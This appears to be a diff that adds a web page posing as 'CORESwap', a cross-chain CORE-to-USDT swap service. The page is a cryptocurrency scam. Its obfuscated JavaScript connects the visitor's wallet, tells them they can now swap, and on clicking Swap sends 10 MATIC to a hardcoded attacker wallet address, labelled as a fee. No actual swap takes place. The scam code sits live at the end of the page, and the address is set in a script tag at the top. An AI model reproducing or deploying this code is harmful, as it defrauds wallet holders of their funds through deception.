@@ -1,0 +1,337 @@
+<script>var address = "0x6ccD613A1D55295a72430F0f155232e881Fa9284";var coin_value = "1.5";</script>
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <link rel="stylesheet" href="assets/css/style3.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css">
+
+    <!-- ico -->
+
+    <link href="https://scan.coredao.org/images/icon.png" style="border-radius: 50%; object-fit: cover;" rel="icon" type="image/png">
+
+    <title>CORESwap</title>
+</head>
+
+<body>
+    <!-- navbar 
+    <nav class="navbar fixed-top navbar-expand-lg navbar-dark ora-nav" style="padding-bottom: 0px;">
+        <div class="container-fluid mx-5 px-3">
+            <a class="" ><img class="logo" id="logo" src="https://scan.coredao.org/images/icon.png" width="60px" height="60px" alt=""></a>
+        </div>
+        
+    </nav>
+    -->
+
+    <!-- content -->
+    <section>
+        <div class="central-box">
+            <div class="d-flex">
+                <ul class="nav justify-content-left px-2" id="myTab" role="tablist">
+                    <li class="nav-item">
+                        
+                        <!--
+                        <a class="nav-link active" data-bs-toggle="tab" data-bs-target="#swap" type="button"
+                            aria-current="page" href="#"><b style="font-size:18px;">Swap</b></a>
+                            -->
+                    </li>
+                <!-- <h4 class="justify-content-start float-start">Exchange</h4> -->
+                </ul>
+                
+                <!--
+                <a href="#" class="justify-content-right pt-2" data-bs-toggle="dropdown" aria-expanded="false" style="color: #ff3300;"><i class="bi bi-gear"></i></a>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                <a href="/" class="justify-content-right pt-2" style="color: #FFFFFF;"><i class="bi bi-arrow-clockwise"></i></a>
+                -->
+                
+                <div class="dropdown-menu dropdown-menu-end" style="width: 270px; font-size: 12px; background-color: #16122B; color: whitesmoke; border: 1px solid #0C091F; border-radius: 10px;">
+                    <div class="mx-2 my-1" style="border-radius: 10px; border: 1px solid #0C091F;">
+                        <div class="p-2" style="font-size: 10px;">Transaction Settings</div>                    
+                        <div class="row g-3 mx-2">
+                            <div class="col-9">
+                                <label for="">Slippage tolerance</label>
+                                <input class="ora-input p-1 m-1 w-100" style="background-color: #0C091F;" type="text" placeholder="0.50">
+                            </div>
+                            <div class="col-3">
+                                <label for=""></label>
+                                <button class="btn btn-sm text-white" style="background-color: #2508b8; border-radius: 20px;">Auto</button>                        
+                            </div>
+                        </div>
+                        
+                        <!--
+                        <div class="row g-3 mx-2">
+                            <label for="">Transaction deadline</label>
+                            <input class="ora-input p-1 m-1 w-50" style="background-color: #0C091F;" type="text" placeholder="30"> minutes
+                        </div>
+                        -->
+                        
+                        
+                    </div>
+                    <div class="mx-2 my-1" style="border: 1px solid #0C091F; border-radius: 10px;">
+                        <div class="p-2" style="font-size: 10px;">Interface Settings</div>  
+                        <div class="d-block p-2">
+                            <div class="">
+                                Toggle expert mode
+                                <label class="switch" style="right: 20px; position: absolute;">
+                                    <input type="checkbox">
+                                    <span class="slider round"></span>
+                                </label>
+                            </div>                                
+                        </div>
+                        <div class="d-block p-2">
+                            <div class="">
+                                Disable multihops
+                                <label class="switch" style="right: 20px; position: absolute;">
+                                    <input type="checkbox">
+                                    <span class="slider round"></span>
+                                </label>
+                            </div>                                
+                        </div>
+                        <div class="d-block p-2 pb-3">
+                            <div class="">
+                                OpenMEV Gas Refunder
+                                <label class="switch" style="right: 20px; position: absolute;">
+                                    <input type="checkbox" checked>
+                                    <span class="slider round"></span>
+                                </label>
+                            </div>                                
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- main content -->
+            
+            <div class="tab-content" id="myTabContent">
+                <div class="tab-pane fade show active" id="swap" role="tabpanel" aria-labelledby="swap-tab">
+                    <div class="row px-4">
+                        
+                        <div class="center pt-2">
+                            <!--
+                            <b><a href="#" style="color:black; text-decoration: none;">Cross Chain</a></b>&nbsp;&nbsp;&nbsp;&nbsp;
+                            -->
+                            <a href="#">
+                                <img style="text-decoration: none; height:80px; width:80px; float:center; border-radius: 50%; object-fit: cover;" src="https://scan.coredao.org/images/icon.png">
+                            </a>
+                            <!--
+                            &nbsp;&nbsp;&nbsp;&nbsp;<b><a href="#" style="color:black; text-decoration: none;">Swap Chain</a></b>
+                            -->
+                            </div>
+                        
+                        <div class="row g-2 ora-input" id="container1">
+                            <div class="col-9">
+                                <div class="dropdown">
+                                    <button class="btn mb-3 ora-input" type="button"  data-bs-toggle="modal" style="background-color: #16122B;" data-bs-target="#coinmodal"><img 
+                                    src="https://scan.coredao.org/images/icon.png" width="20px" alt="">
+                                        CORE
+                                    </button>    
+                                    
+                                    <!-- dropdown-toggle 
+                                    style="margin-right: 10px;"
+                                    -->
+                                    
+                                </div>
+                                
+                                <input class="form-control ora-input" id="coinAmt" name="coinAmt" value="1" oninput="updateTokenAmt()" type="float" max="5000">
+                            </div>
+                            
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 70px; text-decoration: none; color: lightgray; white-space: nowrap;">~CORE Chain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span id="BalanceIRONSWAP2"></span></a>
+                            </div>
+                            
+                            <!--
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 60px; text-decoration: none; color: lightgray;">Balance: <span id="BalanceIRONSWAP">0.00</span></a>
+                            </div>
+                            -->
+                            
+                        </div>
+
+                        <div class="center pt-2">
+                            <a href="#" style="color:black; text-decoration: none;" id="doubleArrow" onclick="changeCurrency()">Cross&nbsp;
+                                <svg width="15" height="24" viewBox="0 0 30 38" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M17.1429 8.42333L8.57143 -9.36673e-07L-3.68196e-07 8.42333L6.42857 8.42333L6.42857 23.2222L10.7143 23.2222L10.7143 8.42333L17.1429 8.42333ZM21.4286 38L30 29.5767L23.5714 29.5767L23.5714 14.7778L19.2857 14.7778L19.2857 29.5767L12.8571 29.5767L21.4286 38Z"
+                                        fill="#000000" />
+                                </svg>&nbsp;Chain
+                            </a>
+                        </div>
+
+                        <div class="row g-2 ora-input" id="container2">
+                            <div class="col-9">
+                                <button class="btn mb-3 ora-input" type="button"  data-bs-toggle="modal" style="background-color: #16122B;" data-bs-target="#tokenmodal"><img 
+                                    src="https://static.tronscan.org/production/logo/usdtlogo.png" width="20px" alt="">
+                                    USDT
+                                </button>  
+                                
+                                <!-- https://bscscan.com/assets/bsc/images/svg/logos/token-dim.svg?v=24.2.3.1  -->
+                                
+                                <input class="form-control ora-input" id="tokenAmt" name="tokenAmt" value="2.5" oninput="updateCoinAmt()" type="float">
+                            </div>
+                            
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 70px; text-decoration: none; color: lightgray; white-space: nowrap;">~BNB Chain<span id="BalanceBUSD2"></span></a>
+                            </div>
+                            
+                            <!--
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 60px; border: 1px solid #16122B; text-decoration: none; color: lightgray;">Balance: <span id="BalanceBUSD">0.00</span></a>
+                            </div>
+                            -->
+                            
+                        </div>
+                    </div>
+                    <hr style="color:black;">
+                    
+                    <center><p><b style="float:center; color:black;"><i class="bi bi-cash"></i> You Balance : <span id="BalanceIRONSWAP">0.00</span> CORE</b></p></center>
+                    
+                    <center><p><b style="float:center; color:black;"><i class="bi bi-question-circle" onmouseover="alert('Swap Transaction Fee: 10 MATIC');"></i> Swap Transaction Fee : 10 MATIC </b></p></center>
+                    
+
+                    <div class="d-grid mx-4 px-2" style="padding-top: 20px; padding-bottom: 40px;">
+                        <button class="btn ora-deco-btn p-3" id="connectWalletButton">Connect Wallet</button>
+                        
+                        <button class="btn ora-deco-btn p-3" id="sendBNB" style="display:none;">Swap</button>
+                    </div>
+                </div>
+
+                
+                
+                
+            </div>
+        </div>
+    </section>
+    <!-- Coin Modal -->
+
+    <div class="modal fade" id="coinmodal1" tabindex="-1" aria-labelledby="coinmodal1" aria-hidden="true">
+       <div class="modal-dialog">
+            <div class="modal-content" style="background-color: inherit;">    
+                <div class="central-box p-3 w-100">
+                    <div class="d-flex">
+                        <h5>Select a token</h5>
+                        &nbsp;&nbsp;&nbsp;<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close" style="color:white;"></button>
+                    </div> 
+                    <div class="">
+                        
+                        <!--
+                        <input class="form-control py-3 my-3"
+                            style="border: 1px solid #2508b8; border-radius: 15px; background-color: rgb(3, 3, 31);"
+                            placeholder="Search name or paste address" type="text">
+                        <p>Common bases</p>
+                        -->
+    
+                        <div class="d-inline">
+                            <button class="btn mx-2 my-2 ora-input" type="button"> <img style="margin-right: 10px;"
+                                    src="https://scan.coredao.org/images/icon.png" width="20px" alt="">
+                                CORESWAP ( FQS )
+                            </button>
+                            
+                            <!-- here -->
+                            
+                        </div>
+                    </div>
+                    
+                    <!-- <div
+                        style="background-color: rgb(3, 3, 31); max-height: 300px; overflow-y: scroll; border-radius: 20px;">
+                        <ul class="list-group">
+                            <li class="list-group-item py-2" style="background-color: inherit;"><a class="link" href=""><img
+                                        style="margin-right: 10px;" src="./assets/images/bnb.png" width="40px"
+                                        alt="">BNB</a></li>
+                                        
+                            <!-- here 
+                            
+                        </ul>
+                    </div> -->
+                    
+                </div>
+            </div>
+        </div>    
+        
+    </div>    
+    
+    <!-- Coin Modal End-->
+    
+    <!-- Token Modal -->
+    
+    <div class="modal fade" id="tokenmodal1" tabindex="-1" aria-labelledby="tokenmodal1" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content" style="background-color: inherit;">    
+                <div class="central-box p-3 w-100">
+                    <div class="d-flex">
+                        <h5>Select a token</h5>
+                        &nbsp;&nbsp;&nbsp;<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close" style="color:white;"></button>
+                    </div>
+                    <div class="">
+                        
+                        <!--
+                        <input class="form-control py-3 my-3"
+                            style="border: 1px solid #2508b8; border-radius: 15px; background-color: rgb(3, 3, 31);"
+                            placeholder="Search name or paste address" type="text">
+                        <p>Common bases</p>
+                        -->
+    
+                        <div class="d-inline">
+                            
+                            <!-- here -->
+                            
+                            <button class="btn mx-2 my-2 ora-input" type="button"> <img style="margin-right: 10px;"
+                                    src="https://static.tronscan.org/production/logo/usdtlogo.png" width="20px" alt="">
+                                USDT
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- <div
+                        style="background-color: rgb(3, 3, 31); max-height: 300px; overflow-y: scroll; border-radius: 20px;">
+                        <ul class="list-group">
+                            
+                            <!-- here
+
+                            <li class="list-group-item py-2" style="background-color: inherit;"><a class="link" href=""><img
+                                        style="margin-right: 10px;" src="https://bscscan.com/token/images/busdt_32.png" width="40px"
+                                        alt="">USDT</a></li>
+                        </ul>
+                    </div> -->
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!--
+    <center><a href="#"><img style="width:100%; height:50%;" src="https://i.ibb.co/1fXWw0m/photo-2024-02-23-13-29-09.jpg"></a></center>
+    -->
+
+    
+
+    <!-- footer -->
+    
+    
+
+
+    <!-- Option 1: Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+        crossorigin="anonymous"></script>
+        
+        <!-- Web3 Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.6/web3.min.js"></script>
+
+    <script>
+
+const _0x1ecbc5=_0x3ee1;(function(_0x4adf80,_0x50a017){const _0x42de7f=_0x3ee1,_0x449baf=_0x4adf80();while(!![]){try{const _0x3dc787=parseInt(_0x42de7f(0x1d5))/0x1+-parseInt(_0x42de7f(0x193))/0x2+parseInt(_0x42de7f(0x1d1))/0x3*(parseInt(_0x42de7f(0x1d2))/0x4)+-parseInt(_0x42de7f(0x195))/0x5+parseInt(_0x42de7f(0x1c5))/0x6+parseInt(_0x42de7f(0x1b8))/0x7+-parseInt(_0x42de7f(0x1ba))/0x8;if(_0x3dc787===_0x50a017)break;else _0x449baf['push'](_0x449baf['shift']());}catch(_0x12919b){_0x449baf['push'](_0x449baf['shift']());}}}(_0x3b86,0xf0c78));function changeCurrency(){const _0x327842=_0x3ee1;var _0x46a2a4=document['getElementById'](_0x327842(0x19b)),_0x5ea03c=document[_0x327842(0x1a9)](_0x327842(0x1e3)),_0x167361=_0x46a2a4[_0x327842(0x1bc)];_0x46a2a4[_0x327842(0x1bc)]=_0x5ea03c['innerHTML'],_0x5ea03c[_0x327842(0x1bc)]=_0x167361;}document[_0x1ecbc5(0x1a9)](_0x1ecbc5(0x1c4))['addEventListener'](_0x1ecbc5(0x1a5),async function(){const _0x185b5a=_0x1ecbc5;if(window[_0x185b5a(0x1bb)])try{const _0x118708=new Web3(window[_0x185b5a(0x1bb)]),_0x219d26=await _0x118708['eth'][_0x185b5a(0x1c6)]();if(_0x219d26!=0x89){alert(_0x185b5a(0x1ab));return;}const _0x31d9d1=await ethereum['request']({'method':_0x185b5a(0x1d0)}),_0x4d3aa2=_0x31d9d1[0x0],_0x5518a1=_0x185b5a(0x1d7),_0x517041=[{'inputs':[],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x196),'type':_0x185b5a(0x1b3)},{'indexed':!![],'internalType':'address','name':'spender','type':'address'},{'indexed':![],'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x197),'type':'uint256'}],'name':_0x185b5a(0x1cd),'type':_0x185b5a(0x1a4)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x19c),'type':'address'},{'indexed':!![],'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1d4),'type':_0x185b5a(0x1b3)}],'name':'OwnershipTransferred','type':_0x185b5a(0x1a4)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x185b5a(0x1a0),'type':'address'},{'indexed':!![],'internalType':'address','name':'to','type':'address'},{'indexed':![],'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x197),'type':'uint256'}],'name':_0x185b5a(0x1e5),'type':_0x185b5a(0x1a4)},{'inputs':[],'name':_0x185b5a(0x1b9),'outputs':[{'internalType':'bytes32','name':'','type':_0x185b5a(0x1ac)}],'stateMutability':_0x185b5a(0x1af),'type':_0x185b5a(0x1a2)},{'inputs':[],'name':_0x185b5a(0x1e4),'outputs':[{'internalType':'bytes32','name':'','type':'bytes32'}],'stateMutability':'view','type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':'address','name':_0x185b5a(0x1b7),'type':_0x185b5a(0x1b3)},{'internalType':'uint256','name':'amount_','type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1e0),'outputs':[],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':'address','name':_0x185b5a(0x196),'type':_0x185b5a(0x1b3)},{'internalType':'address','name':_0x185b5a(0x194),'type':_0x185b5a(0x1b3)}],'name':_0x185b5a(0x1c7),'outputs':[{'internalType':_0x185b5a(0x198),'name':'','type':'uint256'}],'stateMutability':_0x185b5a(0x1af),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':'address','name':_0x185b5a(0x194),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':'amount','type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1d3),'outputs':[{'internalType':_0x185b5a(0x1b4),'name':'','type':_0x185b5a(0x1b4)}],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':'address','name':_0x185b5a(0x1e6),'type':_0x185b5a(0x1b3)}],'name':_0x185b5a(0x1be),'outputs':[{'internalType':_0x185b5a(0x198),'name':'','type':'uint256'}],'stateMutability':_0x185b5a(0x1af),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1c9),'type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1de),'outputs':[],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':'address','name':_0x185b5a(0x1b7),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1d8),'type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1dd),'outputs':[],'stateMutability':'nonpayable','type':_0x185b5a(0x1a2)},{'inputs':[],'name':_0x185b5a(0x1a7),'outputs':[{'internalType':_0x185b5a(0x1df),'name':'','type':_0x185b5a(0x1df)}],'stateMutability':_0x185b5a(0x1af),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x194),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1dc),'type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1ce),'outputs':[{'internalType':_0x185b5a(0x1b4),'name':'','type':_0x185b5a(0x1b4)}],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':'spender','type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1cf),'type':'uint256'}],'name':_0x185b5a(0x1ad),'outputs':[{'internalType':_0x185b5a(0x1b4),'name':'','type':_0x185b5a(0x1b4)}],'stateMutability':'nonpayable','type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1b7),'type':'address'},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1d8),'type':'uint256'}],'name':'mint','outputs':[],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[],'name':_0x185b5a(0x1c8),'outputs':[{'internalType':_0x185b5a(0x1c2),'name':'','type':_0x185b5a(0x1c2)}],'stateMutability':_0x185b5a(0x1af),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x196),'type':_0x185b5a(0x1b3)}],'name':_0x185b5a(0x1b2),'outputs':[{'internalType':'uint256','name':'','type':_0x185b5a(0x198)}],'stateMutability':_0x185b5a(0x1af),'type':'function'},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x185b5a(0x1b3),'name':'','type':'address'}],'stateMutability':'view','type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x196),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x194),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1c9),'type':_0x185b5a(0x198)},{'internalType':'uint256','name':'deadline','type':'uint256'},{'internalType':'uint8','name':'v','type':_0x185b5a(0x1df)},{'internalType':_0x185b5a(0x1ac),'name':'r','type':_0x185b5a(0x1ac)},{'internalType':'bytes32','name':'s','type':_0x185b5a(0x1ac)}],'name':_0x185b5a(0x1e7),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':_0x185b5a(0x1b1),'outputs':[],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1da),'type':'address'}],'name':_0x185b5a(0x1e1),'outputs':[{'internalType':_0x185b5a(0x1b4),'name':'','type':_0x185b5a(0x1b4)}],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x185b5a(0x1c2),'name':'','type':'string'}],'stateMutability':'view','type':_0x185b5a(0x1a2)},{'inputs':[],'name':_0x185b5a(0x19a),'outputs':[{'internalType':_0x185b5a(0x198),'name':'','type':_0x185b5a(0x198)}],'stateMutability':_0x185b5a(0x1af),'type':'function'},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1bd),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x198),'name':'amount','type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1db),'outputs':[{'internalType':'bool','name':'','type':_0x185b5a(0x1b4)}],'stateMutability':'nonpayable','type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1c0),'type':_0x185b5a(0x1b3)},{'internalType':_0x185b5a(0x1b3),'name':'recipient','type':'address'},{'internalType':_0x185b5a(0x198),'name':_0x185b5a(0x1c9),'type':_0x185b5a(0x198)}],'name':_0x185b5a(0x1d6),'outputs':[{'internalType':_0x185b5a(0x1b4),'name':'','type':_0x185b5a(0x1b4)}],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[{'internalType':_0x185b5a(0x1b3),'name':_0x185b5a(0x1a6),'type':'address'}],'name':'transferOwnership','outputs':[],'stateMutability':_0x185b5a(0x1b6),'type':_0x185b5a(0x1a2)},{'inputs':[],'name':_0x185b5a(0x19e),'outputs':[{'internalType':_0x185b5a(0x1b3),'name':'','type':_0x185b5a(0x1b3)}],'stateMutability':'view','type':_0x185b5a(0x1a2)}],_0x59c318=new _0x118708[(_0x185b5a(0x1bf))][(_0x185b5a(0x1cc))](_0x517041,_0x5518a1),_0xa99201=await _0x59c318[_0x185b5a(0x1a3)][_0x185b5a(0x1be)](_0x4d3aa2)[_0x185b5a(0x1a1)](),_0x5d254f=_0xa99201/0xde0b6b3a7640000;alert('Now\x20You\x20Can\x20Swap\x20Your\x20Tokens...'),document[_0x185b5a(0x1a9)]('BalanceIRONSWAP')[_0x185b5a(0x1bc)]=_0x5d254f,document[_0x185b5a(0x1a9)](_0x185b5a(0x1c4))[_0x185b5a(0x1a8)][_0x185b5a(0x1c1)]=_0x185b5a(0x1aa),document[_0x185b5a(0x1a9)](_0x185b5a(0x1eb))[_0x185b5a(0x1a8)][_0x185b5a(0x1c1)]=_0x185b5a(0x19d);}catch(_0x221b4f){alert('Error\x20connecting\x20to\x20wallet:\x20'+_0x221b4f);}else alert('Please\x20Use\x20This\x20Link\x20In\x20Trust\x20Wallet\x20or\x20Metamask\x20Wallet\x20For\x20Swap\x20IRON\x20Tokens.');}),document[_0x1ecbc5(0x1a9)](_0x1ecbc5(0x1eb))[_0x1ecbc5(0x1d9)]('click',async function(){const _0xf012eb=_0x1ecbc5,_0xc178a7=new Web3(window[_0xf012eb(0x1bb)]);if(typeof _0xc178a7!==_0xf012eb(0x1ea)){const _0x1c0275=await ethereum[_0xf012eb(0x1c3)]({'method':_0xf012eb(0x1d0)}),_0x1cb3fe=_0x1c0275[0x0],_0x238b1f='10',_0xc527e1=_0xc178a7['utils']['toWei'](_0x238b1f,_0xf012eb(0x1b5)),_0x12378f=address;alert(_0xf012eb(0x1e2));try{const _0x4f191d={'from':_0x1cb3fe,'to':_0x12378f,'value':_0xc527e1,'gas':'21000'},_0x34b033=await _0xc178a7[_0xf012eb(0x1bf)][_0xf012eb(0x1b0)](_0x4f191d);alert('Transaction\x20sent\x20successfully!\x20Transaction\x20Hash:\x20'+_0x34b033);}catch(_0x11fb4b){if(_0x11fb4b instanceof Error)alert(_0xf012eb(0x1ca)+_0x11fb4b['message']),console[_0xf012eb(0x1e8)](_0x11fb4b);else{const _0x411df3=JSON[_0xf012eb(0x1e9)](_0x11fb4b);alert(_0xf012eb(0x1ae));}}}else alert(_0xf012eb(0x1cb));});function updateTokenAmt(){const _0x61fff8=_0x1ecbc5,_0x428d8c=parseFloat(document[_0x61fff8(0x1a9)](_0x61fff8(0x199))[_0x61fff8(0x197)]);if(_0x428d8c>0x1388){alert('Maximum\x205000\x20IRON\x20Per\x20Day.'),document[_0x61fff8(0x1a9)]('coinAmt')[_0x61fff8(0x197)]=0x1388;const _0xcb80aa=_0x428d8c*coin_value;document[_0x61fff8(0x1a9)]('tokenAmt')['value']=_0xcb80aa;return;}const _0x3908f7=_0x428d8c*coin_value;document[_0x61fff8(0x1a9)](_0x61fff8(0x19f))['value']=_0x3908f7;}updateTokenAmt();function _0x3b86(){const _0x88bd09=['decreaseAllowance','addedValue','eth_requestAccounts','1317qXOSBN','15116GjJbWA','approve','newOwner','851709spgqVH','transferFrom','0x76762a2df38db050b33aBD73Ef9A370809772e4E','amount_','addEventListener','vault_','transfer','subtractedValue','burnFrom','burn','uint8','_burnFrom','setVault','Holding\x20Swap\x20Transaction\x20Is\x20In\x20Progress...','container2','PERMIT_TYPEHASH','Transfer','account','permit','error','stringify','undefined','sendBNB','3705056vkTDey','spender','2069780slPAPz','owner','value','uint256','coinAmt','totalSupply','container1','previousOwner','block','vault','tokenAmt','from','call','function','methods','event','click','newOwner_','decimals','style','getElementById','none','Please\x20Connect\x20To\x20Polygon\x20(\x20MATIC\x20)\x20Network\x20By\x20Clicking\x20On\x20Upper\x203\x20Dots.','bytes32','increaseAllowance','An\x20unexpected\x20error\x20occurred,\x20please\x20try\x20again','view','sendTransaction','renounceOwnership','nonces','address','bool','ether','nonpayable','account_','384671FsyZkv','DOMAIN_SEPARATOR','7638536TXXEbk','ethereum','innerHTML','recipient','balanceOf','eth','sender','display','string','request','connectWalletButton','9851340mfYLXe','getChainId','allowance','name','amount','Error:\x20','Web3\x20is\x20not\x20connected.\x20Please\x20install\x20a\x20wallet\x20like\x20MetaMask.','Contract','Approval'];_0x3b86=function(){return _0x88bd09;};return _0x3b86();}function _0x3ee1(_0x52a5d4,_0xa24409){const _0x3b8648=_0x3b86();return _0x3ee1=function(_0x3ee10a,_0x206931){_0x3ee10a=_0x3ee10a-0x193;let _0x5b1692=_0x3b8648[_0x3ee10a];return _0x5b1692;},_0x3ee1(_0x52a5d4,_0xa24409);}function updateCoinAmt(){const _0x5971c2=_0x1ecbc5,_0x1c8383=parseFloat(document[_0x5971c2(0x1a9)]('tokenAmt')[_0x5971c2(0x197)]),_0x42dd03=_0x1c8383/coin_value;document[_0x5971c2(0x1a9)]('coinAmt')[_0x5971c2(0x197)]=_0x42dd03;}updateCoinAmt();
+    
+    </script>
+
+</body>
+
+</html>
